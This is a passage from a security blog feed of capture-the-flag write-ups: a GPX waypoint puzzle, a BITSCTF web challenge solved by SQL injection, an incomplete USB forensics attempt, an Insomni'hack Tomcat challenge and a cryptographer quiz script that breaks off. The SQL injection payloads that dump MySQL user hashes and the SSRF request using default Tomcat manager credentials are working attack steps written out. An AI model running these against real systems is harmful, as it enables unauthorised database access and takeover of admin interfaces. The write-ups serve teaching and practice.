lat=&quot;23.71697&quot; lon=&quot;89.45508&quot;&gt;</div><div class="line">&lt;ele&gt;12.1&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP01-A&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;22.82885&quot; lon=&quot;80.79786&quot;&gt;</div><div class="line">&lt;name&gt;WP02-B&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;39.88276&quot; lon=&quot;58.81642&quot;&gt;</div><div class="line">&lt;name&gt;WP03-C&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;15.43674&quot; lon=&quot;27.65039&quot;&gt;</div><div class="line">&lt;name&gt;WP04-D&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;12.69179&quot; lon=&quot;17.50781&quot;&gt;</div><div class="line">&lt;ele&gt;288.7&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP05-E&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;14.91081&quot; lon=&quot;100.47656&quot;&gt;</div><div class="line">&lt;ele&gt;13.1&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP06-F&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;45.9267&quot; lon=&quot;2.21484&quot;&gt;</div><div class="line">&lt;ele&gt;557.9&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP07-G&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;4.11852&quot; lon=&quot;102.19922&quot;&gt;</div><div class="line">&lt;ele&gt;67.2&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP08-H&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;34.85709&quot; lon=&quot;65.84765&quot;&gt;</div><div class="line">&lt;ele&gt;3209.7&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP09-I&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;28.89086&quot; lon=&quot;68.30859&quot;&gt;</div><div class="line">&lt;ele&gt;116.9&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP10-J&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;39.20502&quot; lon=&quot;31.92187&quot;&gt;</div><div class="line">&lt;ele&gt;797.8&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP11-K&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;47.24344&quot; lon=&quot;19.8457&quot;&gt;</div><div class="line">&lt;ele&gt;93.5&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP12-L&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;25.30828&quot; lon=&quot;29.84765&quot;&gt;</div><div class="line">&lt;ele&gt;267&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP13-M&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;18.97119&quot; lon=&quot;-72.28521&quot;&gt;</div><div class="line">&lt;ele&gt;375&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP14-N&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;-13.61609&quot; lon=&quot;17.68359&quot;&gt;</div><div class="line">&lt;ele&gt;1510.9&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP15-O&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;33.84122&quot; lon=&quot;102.23438&quot;&gt;</div><div class="line">&lt;ele&gt;3426.2&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP16-P&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;46.89624&quot; lon=&quot;69.53907&quot;&gt;</div><div class="line">&lt;ele&gt;364.4&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP17-Q&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;/gpx&gt;</div></pre></td></tr></table></figure></p>
<p>We can open it online with:</p>
<ul>
<li><a href="http://www.visugpx.com/index.php" target="_blank" rel="external">http://www.visugpx.com/index.php</a></li>
<li><a href="http://www.gpsvisualizer.com/map?output_home" target="_blank" rel="external">http://www.gpsvisualizer.com/map?output_home</a></li>
</ul>
<p>Take the waypoint in order and write the name of the country:</p>
<ol>
<li>WP01-A - Bangladesh</li>
<li>WP02-B - India</li>
<li>WP03-C - Turkmenistan</li>
<li>WP04-D - Sudan</li>
<li>WP05-E - Chad</li>
<li>WP06-F - Thailand</li>
<li>WP07-G - France</li>
<li>WP08-H - Malesia</li>
<li>WP09-I - Afganistan</li>
<li>WP10-J - Pakistan</li>
<li>WP11-K - Turkey</li>
<li>WP12-L - Hungary</li>
<li>WP13-M - Egypt</li>
<li>WP14-N - Haiti</li>
<li>WP15-O - Angola</li>
<li>WP16-P - China</li>
<li>WP17-Q - Kazaksztan</li>
</ol>
<p>Taking the first letter of each country in order give me <strong>BITSCTFMAPTHEHACK</strong> and the comment said:</p>
<blockquote>
<p>Use appropriate brackets and underscores to separate words if you succeed</p>
</blockquote>
<p>So I get <strong>BITSCTF{MAP_THE_HACK}</strong></p>
<h1 id="30-batman-vs-joker-web">30 - Batman vs Joker - Web</h1>
<blockquote>
<p>Joker has left a message for you. Your job is to get to the message asap.</p>
<p><a href="http://joking.bitsctf.bits-quark.org" target="_blank" rel="external">joking.bitsctf.bits-quark.org</a></p>
</blockquote>
<p>Try a quick <code>' or 1=1 #'</code>: this is working so we have a vulnerable MySQL database.</p>
<p>Let's enjoy SQLi.</p>
<p>Just curious to know the DB version: <code>' or 1=1 UNION SELECT @@version,1 #</code>: <strong>5.5.54-0+deb8u1</strong></p>
<p>Current databse name: <code>' or 1=1 UNION SELECT database(),1 #</code>: <strong>hack</strong></p>
<p>Just curious to list the databse users: <code>' or 1=1 UNION SELECT host, user FROM mysql.user #</code> and <code>' or 1=1 UNION SELECT user, password FROM mysql.user #</code>:</p>
<table>
<thead>
<tr>
<th>host</th>
<th>user</th>
<th>password</th>
</tr>
</thead>
<tbody>
<tr>
<td>%</td>
<td>tester</td>
<td>*975B2CD4FF9AE554FE8AD33168FBFC326D2021DD</td>
</tr>
<tr>
<td>127.0.0.1, 33842653d6db, ::1, localhost</td>
<td>root</td>
<td>*A2AE2E3109CE064A1AED30C0E71E021540F30700</td>
</tr>
<tr>
<td>localhost</td>
<td>debian-sys-maint</td>
<td>*A9A6626F5FEE26E9EDDE42FF9274124A98F82A3F</td>
</tr>
</tbody>
</table>
<p>I want to know the name of tables in the hack databse: <code>' or 1=1 UNION SELECT table_schema, table_name FROM information_schema.columns WHERE table_schema = 'hack' #</code>:</p>
<table>
<thead>
<tr>
<th>table_schema</th>
<th>table_name</th>
</tr>
</thead>
<tbody>
<tr>
<td>hack</td>
<td>CIA_Official_Records</td>
</tr>
<tr>
<td>hack</td>
<td>joker</td>
</tr>
</tbody>
</table>
<p>And finally I want to know the name of columns in the both previous tables: <code>' or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'CIA_Official_Records' or table_name = 'joker' #</code>:</p>
<table>
<thead>
<tr>
<th>table_name</th>
<th>column_name</th>
</tr>
</thead>
<tbody>
<tr>
<td>CIA_Official_Records</td>
<td>id</td>
</tr>
<tr>
<td>CIA_Official_Records</td>
<td>username</td>
</tr>
<tr>
<td>CIA_Official_Records</td>
<td>first_name</td>
</tr>
<tr>
<td>CIA_Official_Records</td>
<td>last_name</td>
</tr>
<tr>
<td>Joker</td>
<td>Flag</td>
</tr>
<tr>
<td>Joker</td>
<td>HaHaHa</td>
</tr>
</tbody>
</table>
<p>Pretty easy to know where to find teh flag now: <code>' or 1=1 UNION SELECT Flag, HaHaHa FROM Joker #</code>:</p>
<table>
<thead>
<tr>
<th>Flag</th>
<th>HaHaHa</th>
</tr>
</thead>
<tbody>
<tr>
<td>BITSCTF{wh4t_d03snt_k1ll_y0u_s1mply_m4k3s_y0u_str4ng3r!}</td>
<td>Enjoying the game Batman!!!</td>
</tr>
</tbody>
</table>
<h2 id="50-tom-and-jerry-forensics">50 - Tom and Jerry - Forensics</h2>
<p><strong>WARNING</strong>: we didn't solve this challenge, so write-up is incomplete.</p>
<p>Open the pcapng with Wireshark.</p>
<p>Device Descriptor tell us:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">idVendor: Wacom Co., Ltd (0x056a)</div><div class="line">idProduct: CTL-460 [Bamboo Pen (S)] (0x00d4)</div></pre></td></tr></table></figure></p>
<p>So this is a Pen Tablet.</p>
<p>We can use a filter <code>usb.transfer_type == 0x01</code> to oly see frame where there is data.</p>
<p>We can complete the filter with <code>(frame.len == 73)</code> to see only one side of the exchange and <code>!(usb.capdata == 00:00:00:00:00:00:00:00)</code> to hide null data. Finally that give us this filter: <code>((usb.transfer_type == 0x01) &amp;&amp; (frame.len == 73)) &amp;&amp; !(usb.capdata == 00:00:00:00:00:00:00:00)</code>.</p>
<p>USB transfert type is <em>USB INTERRUPT</em>: <a href="http://www.beyondlogic.org/usbnutshell/usb4.shtml#Interrupt" target="_blank" rel="external">http://www.beyondlogic.org/usbnutshell/usb4.shtml#Interrupt</a></p>
<p>To extract the data only from the pcapng I used tshark:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r Cat.pcapng -T fields -e usb.capdata &gt; capdata.txt</div></pre></td></tr></table></figure></p>
<p>I didn't have time to search how to interpret the raw data into coordinates.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="misc" scheme="http://rawsec.ml/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>Insomni&#39;hack teaser - 50 - smarttomcat - Web</title>
    <link href="http://rawsec.ml/en/Insomnihack-2017-Teaser-smarttomcat/"/>
    <id>http://rawsec.ml/en/Insomnihack-2017-Teaser-smarttomcat/</id>
    <published>2017-01-20T23:00:00.000Z</published>
    <updated>2017-02-07T18:23:36.685Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : Insomni'hack teaser 2017</li>
<li><strong>Website</strong> : <a href="http://teaser.insomnihack.ch/" target="_blank" rel="external">teaser.insomnihack.ch</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/382" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="description">Description</h3>
<blockquote>
<p>smarttomcat - Web - 50 pts - realized by xel/grimmlin</p>
<p>Normal, regular cats are so 2000 and late, I decided to buy this allegedly smart tomcat robot
Now the damn thing has attacked me and flew away. I can't even seem to track it down on the broken search interface... Can you help me ?</p>
<p><a href="http://smarttomcat.teaser.insomnihack.ch/" target="_blank" rel="external">Search interface</a></p>
</blockquote>
<h2 id="solution">Solution</h2>
<p>We have a web application like this:</p>
<p><img src="http://i.imgur.com/ey5DMYM.png" alt=""></p>
<p>Let's take a look at sources, there is some JavaScript:</p>
<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">[...]</div><div class="line">&lt;script&gt;</div><div class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> OpenLayers.Map(<span class="string">"map"</span>);</div><div class="line">map.addLayer(<span class="keyword">new</span> OpenLayers.Layer.OSM());</div><div class="line"><span class="keyword">var</span> lonlat = <span class="keyword">new</span> OpenLayers.LonLat(<span class="number">15.2833</span>,<span class="number">-4.2667</span>).transform(<span class="keyword">new</span> OpenLayers.Projection(<span class="string">"EPSG:4326"</span>),map.getProjectionObject());</div><div class="line"><span class="keyword">var</span> zoom = <span class="number">10</span>;</div><div class="line"><span class="keyword">var</span> markers = <span class="keyword">new</span> OpenLayers.Layer.Markers( <span class="string">"Markers"</span> );</div><div class="line">map.addLayer(markers);</div><div class="line"><span class="keyword">var</span> center_marker = <span class="keyword">new</span> OpenLayers.Marker(lonlat);</div><div class="line">markers.addMarker(center_marker);</div><div class="line">map.setCenter(lonlat,zoom);</div><div class="line"><span class="keyword">var</span> request;</div><div class="line">$(<span class="string">'#findcatbycoord'</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</div><div class="line">    event.preventDefault();</div><div class="line">    <span class="keyword">if</span> (request) &#123;</div><div class="line">        request.abort();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> cat_coords = <span class="string">'http://localhost:8080/index.jsp?x='</span> + <span class="built_in">parseFloat</span>($(<span class="string">'#xcoord'</span>).val()) + <span class="string">'&amp;y='</span> + <span class="built_in">parseFloat</span>($(<span class="string">'#ycoord'</span>).val());</div><div class="line">    <span class="keyword">var</span> $form = $(<span class="keyword">this</span>);</div><div class="line">    <span class="keyword">var</span> $inputs = $form.find(<span class="string">'input, select, button, textarea'</span>);</div><div class="line">    $inputs.prop(<span class="string">'disabled'</span>, <span class="literal">true</span>);</div><div class="line"></div><div class="line">    request = $.ajax(&#123;</div><div class="line">        url: <span class="string">'/index.php'</span>,</div><div class="line">        type: <span class="string">'post'</span>,</div><div class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">          markers.clearMarkers();</div><div class="line">          <span class="keyword">while</span>(map.popups.length) &#123;map.removePopup(map.popups[<span class="number">0</span>]);&#125;</div><div class="line">          <span class="keyword">var</span> y = <span class="built_in">parseFloat</span>($(<span class="string">'#ycoord'</span>).val());</div><div class="line">          <span class="keyword">var</span> x = <span class="built_in">parseFloat</span>($(<span class="string">'#xcoord'</span>).val());</div><div class="line">          <span class="keyword">if</span> (<span class="built_in">isNaN</span>(y) || <span class="built_in">isNaN</span>(x)) &#123;y = <span class="number">15.2833</span>; x = <span class="number">-4.2667</span>;&#125;</div><div class="line">          lonlat = <span class="keyword">new</span> OpenLayers.LonLat(y,x).transform(<span class="keyword">new</span> OpenLayers.Projection(<span class="string">"EPSG:4326"</span>),map.getProjectionObject());</div><div class="line">          center_marker = <span class="keyword">new</span> OpenLayers.Marker(lonlat);</div><div class="line">          markers.addMarker(center_marker);</div><div class="line">          popup = <span class="keyword">new</span> OpenLayers.Popup.FramedCloud(<span class="string">"popup"</span>,</div><div class="line">                   lonlat,</div><div class="line">                   <span class="literal">null</span>,</div><div class="line">                   data, <span class="literal">null</span>,</div><div class="line">                   <span class="literal">true</span>);</div><div class="line">          map.addPopup(popup);</div><div class="line">          map.setCenter(lonlat,zoom);</div><div class="line">        &#125;,</div><div class="line">        data: &#123;</div><div class="line">		u: cat_coords</div><div class="line">	&#125;</div><div class="line">    &#125;);</div><div class="line">    request.always(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">       $inputs.prop(<span class="string">'disabled'</span>, <span class="literal">false</span>);</div><div class="line">    &#125;);</div><div class="line"></div><div class="line">&#125;);</div><div class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div><div class="line">[...]</div></pre></td></tr></table></figure></p>
<p>The interesting line is:
<code>var cat_coords = 'http://localhost:8080/index.jsp?x=' + parseFloat($('#xcoord').val()) + '&amp;y=' + parseFloat($('#ycoord').val());</code>. So we have one web serve that is a proxy for a web application.</p>
<p>We can see in http headers that the front-end server is <code>Apache/2.4.18 (Ubuntu)</code>.</p>
<p>The description is suggesting we have a Tomcat web app.</p>
<p>In the javascript we can see <code>var map = new OpenLayers.Map(&quot;map&quot;);</code> and <code>OpenLayers</code> is a class of GeoServer.</p>
<p>What do we have?</p>
<ul>
<li>Front-end: <code>Apache/2.4.18 (Ubuntu)</code></li>
<li>Back-end: <code>Apache Tomcat/7.0.68 (Ubuntu)</code></li>
<li>Map-core: <code>GeoServer</code></li>
</ul>
<p>In the javascript we also see <code>if (isNaN(y) || isNaN(x)) {y = 15.2833; x = -4.2667;}</code> that means the browser won't let us send anything else than numbers in the form. We should use Hackbar or curl.</p>
<p>What to do now? We guessed this is a Tomcat web app so let's find the Tomcat Manager (administration panel for Tomcat web server).</p>
<p>A normal request (POST data) would be:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">u=http://localhost:8080/index.jsp?x=42%26y=1337</div></pre></td></tr></table></figure></p>
<p>With curl:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&amp; curl --data &quot;u=http://localhost:8080/index.jsp?x=42%26y=1337&quot; http://smarttomcat.teaser.insomnihack.ch/</div><div class="line">Tomcat not found ! Try again</div></pre></td></tr></table></figure></p>
<p>Now let's try to reach the Tomcat Manager page which is usually: <code>http://example.org:8180/manager/html</code>. Here we have the manager also running on port <code>8080</code>.</p>
<p>So with curl:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&amp; curl --data &quot;u=http://127.0.0.1:8080/manager/html/&quot; http://smarttomcat.teaser.insomnihack.ch/</div><div class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Apache Tomcat/7.0.68 (Ubuntu) - Error report&lt;/title&gt;&lt;style&gt;&lt;!--H1 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;&#125; H2 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;&#125; H3 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;&#125; BODY &#123;font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;&#125; B &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;&#125; P &#123;font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;&#125;A &#123;color : black;&#125;A.name &#123;color : black;&#125;HR &#123;color : #525D76;&#125;--&gt;&lt;/style&gt; &lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 401 - &lt;/h1&gt;&lt;HR size=&quot;1&quot; noshade=&quot;noshade&quot;&gt;&lt;p&gt;&lt;b&gt;type&lt;/b&gt; Status report&lt;/p&gt;&lt;p&gt;&lt;b&gt;message&lt;/b&gt; &lt;u&gt;&lt;/u&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;description&lt;/b&gt; &lt;u&gt;This request requires HTTP authentication.&lt;/u&gt;&lt;/p&gt;&lt;HR size=&quot;1&quot; noshade=&quot;noshade&quot;&gt;&lt;h3&gt;Apache Tomcat/7.0.68 (Ubuntu)&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;%</div></pre></td></tr></table></figure></p>
<p>With hackbar:</p>
<p><img src="http://i.imgur.com/q3IC28Y.png" alt=""></p>
<p>We can see the following error: <code>HTTP Status 401: This request requires HTTP authentication.</code>
This is because we should provide some Basic Auth informations.</p>
<p>Default credentials of Tomcat Manager are <code>tomcat:tomcat</code>.</p>
<p>So the http header for authentification should be <code>Authorization: Basic dG9tY2F0OnRvbWNhdA==</code>.</p>
<p>The option to pass basic authentification to curl is <code>-u</code> but doing the following command won't work:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ curl -u tomcat:tomcat --data &quot;u=http://127.0.0.1:8080/manager/html/&quot; http://smarttomcat.teaser.insomnihack.ch/</div></pre></td></tr></table></figure></p>
<p>Because this will provide the authentification to the Apache front-end instead of giving it to the proxyfied Tomcat Manager running on the back-end.</p>
<p>But it's possible to directly provide credentials for basic autentification in the URL, for example: <code>http://user:pass@example.org</code>.</p>
<p>Let's do it:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ curl --data &quot;u=http://tomcat:tomcat@127.0.0.1:8080/manager/html/&quot; http://smarttomcat.teaser.insomnihack.ch/</div><div class="line">We won&apos;t give you the manager, but you can have the flag : INS&#123;th1s_is_re4l_w0rld_pent3st&#125;</div></pre></td></tr></table></figure></p>
<p>The flag was: <code>INS{th1s_is_re4l_w0rld_pent3st}</code>. No need to find the coordinates.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Insomni&#39;hack teaser - 50 - cryptoquizz - Misc</title>
    <link href="http://rawsec.ml/en/Insomnihack-2017-Teaser-cryptoquizz/"/>
    <id>http://rawsec.ml/en/Insomnihack-2017-Teaser-cryptoquizz/</id>
    <published>2017-01-20T23:00:00.000Z</published>
    <updated>2017-02-07T18:23:36.685Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : Insomni'hack teaser 2017</li>
<li><strong>Website</strong> : <a href="http://teaser.insomnihack.ch/" target="_blank" rel="external">teaser.insomnihack.ch</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/382" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="description">Description</h3>
<blockquote>
<p>cryptoquizz - Misc/Crypto - 50 pts - realized by cryptopathe</p>
<p>Hello, young hacker. Are you ready to fight rogue machines ? Now, you'll have to prove us that you are a genuine cryptographer.</p>
<p>Running on <a href="http://quizz.teaser.insomnihack.ch:1031" target="_blank" rel="external">quizz.teaser.insomnihack.ch:1031</a></p>
</blockquote>
<h2 id="solution">Solution</h2>
<p><strong>Goal</strong>: In this challenge, a server a get us a name (of a famous cryptographer) and we have to find his/her birth year. Then we must send the year to the server and do it again for others cryptographers until we get the flag.</p>
<p>To find the year of someone famous it is possible to use the <a href="https://www.mediawiki.org/wiki/API" target="_blank" rel="external">Wikimedia API</a>. I tried the API <a href="https://en.wikipedia.org/wiki/Special:ApiSandbox" target="_blank" rel="external">sandbox</a> and figured that it was difficult to use it manually.</p>
<p>The wikimedia API works for all the Wikimedia Fundation entities, for example: Wikipedia, Wikidata,...</p>
<p>As we only want the birt year of the cryptographer we should prefer to use <a href="https://www.wikidata.org/" target="_blank" rel="external">Wikidata</a> instead of <a href="https://en.wikipedia.org/" target="_blank" rel="external">wikipedia</a>, there is less data to parse.</p>
<p>As I like ruby for scripting, I chose to use a ruby gem: a Wikidata API Client named <a href="https://rubygems.org/gems/wikidata-client/" target="_blank" rel="external"><strong>wikidata-client</strong></a>. Here is the <a href="http://www.rubydoc.info/gems/wikidata-client/" target="_blank" rel="external">documentation</a>.</p>
<p>Fist I only looked for the first person of the result. But I had soem wrong asnwer.
Because the server is giving wrong or partial name.
For example the server give <em>Ross Anderson</em> but there are:</p>
<ul>
<li><em>Ross Anderson</em> an alpine skier</li>
<li><em>Ross Anderson</em> a swimmer</li>
<li><em>Ross J. Anderson</em> a computer scientist, cryptographer</li>
</ul>
<p>Another example is the server also giving diminutive or nickname like <em>Ron Rivest</em> for <em>Ronald Rivest</em>. This is not a problem for Ronald but with <em>Jim Massey</em> this is. There is a cryptographer named <em>James Lee Massey</em> and his nickname <em>Jimmy Massey</em> and the diminutive of <em>Jimmy</em> is <em>Jim</em>. Problem is that the real <em>Jim Massey</em> is a comics writer and the server is giving a diminutive of a nickname of <em>James Lee Massey</em>...</p>
<p>So I had to create a <em>homonym avoidance</em> by checking the occupation of the person but this function takes too much time as it needs more requests and regex. So I finally disabled this function because it was making my requests timed out.
So I had to run my script several and have the luck not to search for ambiguous name and to finally get the flag.</p>
<p>Here is my ruby script:</p>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'socket'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'wikidata'</span></div><div class="line"></div><div class="line">hostname = <span class="string">'quizz.teaser.insomnihack.ch'</span></div><div class="line">port = <span class="number">1031</span></div><div class="line"></div><div class="line">s = TCPSocket.open(hostname, port)</div><div class="line">raw = <span class="string">''</span></div><div class="line">flag = <span class="literal">false</span></div><div class="line">find = <span class="literal">false</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> line = s.gets   <span class="comment"># Read lines from the socket</span></div><div class="line">    puts line.chop    <span class="comment"># And print with platform line terminator</span></div><div class="line">    raw += line</div><div class="line">    <span class="keyword">if</span> raw.match(<span class="regexp">/~~ What/</span>) &amp;&amp; flag == <span class="literal">false</span></div><div class="line">        name = raw.match(<span class="regexp">/^~~ What is the birth year of ([a-zA-Z\s\-\.]*) ?/</span>).captures[<span class="number">0</span>]</div><div class="line">        name = name[<span class="number">0</span>...-<span class="number">1</span>]</div><div class="line">        search = Wikidata::Item.search <span class="string">"<span class="subst">#&#123;name&#125;</span>"</span></div><div class="line">        <span class="keyword">if</span> search.empty? == <span class="literal">false</span></div><div class="line">            <span class="keyword">while</span> find == <span class="literal">false</span></div><div class="line">                man = search.results.first</div><div class="line">                <span class="comment">#occupation = man.properties('P106').to_s</span></div><div class="line">                <span class="comment">#if occupation.match(/crypto/) || occupation.match(/computer/)</span></div><div class="line">                <span class="keyword">if</span> <span class="literal">true</span> <span class="comment"># homonym avoidance take to much time</span></div><div class="line">                    birth_year = man.date_of_birth.date.year</div><div class="line">                    puts <span class="string">"<span class="subst">#&#123;name&#125;</span>: <span class="subst">#&#123;birth_year&#125;</span>"</span></div><div class="line">                    s.puts birth_year</div><div class="line">                    raw = <span class="string">''</span></div><div class="line">                    find = <span class="literal">true</span></div><div class="line">                <span class="keyword">else</span></div><div class="line">                    puts <span class="string">"shift"</span></div><div 